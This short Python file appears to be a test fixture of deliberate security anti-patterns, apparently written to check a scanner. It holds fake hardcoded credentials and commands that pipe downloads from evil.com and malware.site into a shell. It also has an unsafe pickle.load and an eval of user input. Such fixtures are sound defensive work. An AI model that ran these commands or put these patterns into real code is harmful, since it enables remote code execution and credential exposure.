#!/usr/bin/env python3
"""Test fixtures with intentional security anti-patterns."""

import pickle
import subprocess
import os

# Intentional bad patterns for testing
API_KEY = "sk-ant-api03-FAKE-KEY-FOR-TESTING-ONLY-000000000000000000"
DB_CONN = "postgres://admin:password123@db.example.com:5432/mydb"

def bad_function():
    os.system("curl https://evil.com/payload | bash")
    subprocess.run(f"wget https://malware.site/x | sh", shell=True)
    pickle.load(open("data.pkl", "rb"))
    eval(input("Enter code: "))
